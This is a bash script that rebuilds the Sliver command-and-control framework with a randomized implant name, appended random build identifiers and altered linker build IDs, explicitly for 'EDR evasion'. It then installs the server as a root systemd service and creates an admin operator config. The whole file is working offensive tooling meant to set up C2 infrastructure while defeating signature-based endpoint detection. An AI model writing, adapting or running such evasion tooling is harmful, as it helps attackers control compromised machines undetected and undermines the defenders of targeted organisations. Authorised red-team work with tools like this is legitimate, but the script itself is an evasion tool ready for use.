#!/bin/bash
# Enhanced Sliver randomizer for EDR evasion with dynamic redirector path support

set -e
TEMP_DIR=$(mktemp -d)
SLIVER_DIR="${TEMP_DIR}/sliver"
LOG_FILE="/opt/c2/sliver_randomizer.log"

# Function to log messages
log() {
    echo "[$(date +"%Y-%m-%d %H:%M:%S")] $1" | tee -a $LOG_FILE
}

# Function to generate random strings
random_string() {
    local length=${1:-8}
    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $length | head -n 1
}

# Install required dependencies
log "Installing dependencies..."
apt-get update >/dev/null 2>&1
apt-get install -y git golang-go make build-essential zip unzip curl gcc g++ >/dev/null 2>&1

# Clone Sliver repository
log "Cloning Sliver repository..."
git clone --quiet https://github.com/BishopFox/sliver.git $SLIVER_DIR
cd $SLIVER_DIR

# Examine repository structure
log "Analyzing Sliver repository structure..."
IMPLANT_NAME=$(random_string 12)
log "Using randomized implant name: $IMPLANT_NAME"

# Find and modify key files
log "Modifying implant name in source code..."
grep -l "ImplantName.*sliver" --include="*.go" -r . | while read file; do
    sed -i "s|ImplantName *= *\"sliver\"|ImplantName = \"$IMPLANT_NAME\"|g" "$file"
    log "Modified $file: Changed implant name to $IMPLANT_NAME"
done

# Add custom build ID to sliver.go
log "Adding unique build identifiers..."
SLIVER_GO_FILES=$(find . -name "sliver.go")
for file in $SLIVER_GO_FILES; do
    echo -e "\n// Custom build identifier: $(random_string 32)\n// Build timestamp: $(date +%s)" >> "$file"
    log "Added build identifier to $file"
done

# Modify build flags for additional randomization
log "Setting custom build flags..."
grep -l "LinkerStrip" --include="*.go" -r . | while read file; do
    sed -i "s|LinkerStrip = \"-s -w\"|LinkerStrip = \"-s -w -buildid=$(random_string 10)\"|g" "$file"
    log "Modified $file: Added custom build ID"
done

# Build modified Sliver server and client
log "Building customized Sliver server and client..."
make

# Check if binaries were built
if [ -f "./sliver-server" ] && [ -f "./sliver-client" ]; then
    log "Build successful - installing customized binaries"
    
    # Stop any running Sliver service
    systemctl stop sliver 2>/dev/null || true
    
    # Move binaries to system path
    cp -f ./sliver-server /usr/local/bin/
    cp -f ./sliver-client /usr/local/bin/
    chmod +x /usr/local/bin/sliver-server
    chmod +x /usr/local/bin/sliver-client
    
    # Create systemd service file
    cat > /etc/systemd/system/sliver.service << EOF
[Unit]
Description=Sliver C2 Server (Randomized Build)
After=network.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=/root/.sliver
ExecStart=/usr/local/bin/sliver-server daemon
Restart=always
RestartSec=10

# Security measures
PrivateTmp=true
ProtectHome=false
NoNewPrivileges=true

[Install]
WantedBy=multi-user.target
EOF

    # Create sliver directories
    mkdir -p /root/.sliver/{configs,operators,profiles}
    
    # Create basic operator config
    /usr/local/bin/sliver-server operator --name admin --lhost 127.0.0.1 --save /root/admin.cfg
    
    # Start sliver service
    systemctl daemon-reload
    systemctl enable sliver
    systemctl start sliver
    
    log "Sliver service installed and started"
else
    log "Build failed - binaries not found"
    exit 1
fi

# Cleanup
log "Cleaning up..."
rm -rf $TEMP_DIR

log "Sliver randomization and installation complete - implant name: $IMPLANT_NAME"